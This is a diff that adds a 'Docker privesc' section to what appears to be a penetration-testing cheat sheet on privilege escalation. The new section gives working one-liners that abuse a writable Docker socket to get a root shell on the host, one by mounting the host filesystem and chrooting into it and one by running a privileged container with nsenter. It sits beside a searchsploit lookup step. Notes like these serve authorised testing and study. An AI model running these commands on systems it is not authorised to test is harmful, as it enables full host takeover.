@@ -190,7 +190,23 @@ Method 2:
 1. Look for binaries, especially non-standard ones.
 2. Run `$ searchsploit [binary_name] [version]` and exploit.
 
+### Docker privesc
 
+Basic privesc example: https://flast101.github.io/docker-privesc/
+
+Writable Docker Socket */var/run/docker.sock*
+* Detected Linpeas.sh or manually.
+* Requires image -> if none, run `docker pull` to download an image to machine.
+```
+# CHECK IF WRITABLE
+$ ls -la /var/run/docker.sock
+
+# OPTION 1
+$ docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
+
+# OPTION 2
+docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
+```
 
 
 ## Windows Privilege Escalation
